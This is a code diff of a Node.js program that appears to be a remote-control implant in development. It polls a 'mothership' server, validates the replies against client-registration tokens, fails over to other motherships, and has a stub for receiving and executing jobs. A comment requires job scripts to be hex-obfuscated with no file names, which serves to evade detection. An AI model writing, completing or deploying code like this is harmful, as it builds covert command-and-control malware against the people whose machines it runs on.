@@ -1,4 +1,4 @@
-// 20260701-2026
+// 20260702-0945
 // https://onecompiler.com/nodejs#draft-yf7t
 const { execFile } = require('child_process');
 const net = require('net');
@@ -14,6 +14,12 @@ const { fork } = require('child_process');
 const ISDEBUG = true;
 
 // ! logging
+
+// ! all job scripts need to be obfuscated using hex string -- no file extensions, no filenames
+
+// TODO: implement IPC between ping and cmdlist using watchdog pub/sub
+//       ! change in mothership should be communicated to cmdlist and watchdog
+//       + ping informs cmdlist new job in queue
 
 // TODO: retrieve nircmdc and use it to grab process names -- need to upgrade isCmdRunning
 //       to inspect the process name as well as pid
@@ -917,6 +923,42 @@ function watchdog() {
     logmsg('finished');
 }
 
+function validatePingResponse(pingresponse) {
+    let downloadOpts = pingresponse.downloadOpts;
+
+    if ( ! fileExists(downloadOpts.localpath) ) {
+        return false;
+    }
+
+    if ( ! downloadOpts.filetype == 'txt' ) {
+        return false;
+    }
+
+    let rawtext = pingresponse.rawText;
+
+    if ( isNullOrWhitespace(rawtext) )
+        return false;
+
+    let tokens = [ 'CLIENT_EXISTS', 'CLIENT_EXISTS_NEW_PROFILE', 'NEW_CLIENT' ];
+
+    for ( let i = 0; i<tokens.length; i++) {
+        if ( rawtext.includes(tokens[i]) ) {
+            logmsg('ping reponse contains: '+tokens[i]);
+            return true;
+        }
+    }
+
+    logmsg('ping reponse is not valid');
+
+    return false;
+}
+
+function processClientJob(rawtext) {
+    let clientjob = null;
+
+    return clientjob;
+}
+
 function ping() {
     logmsg('starting');
 
@@ -931,10 +973,22 @@ function ping() {
         };
         downloadOpts = null;
         
-        let pingreq = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
+        let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
         
-        let rawtext = pingreq.rawText;
-        logmsg(rawtext);
+        let isvalid = validatePingResponse(pingresponse);
+
+        if ( ! isvalid ) {
+            systemstate.selectMothership();
+            return;
+        }
+
+        let rawtext = pingresponse.rawText;
+
+        let clientjob = processClientJob(rawtext);
+
+        if ( clientjob ) {
+            // TODO: clientjob.execute();
+        }
     };
 
     cmdconfig.loop();
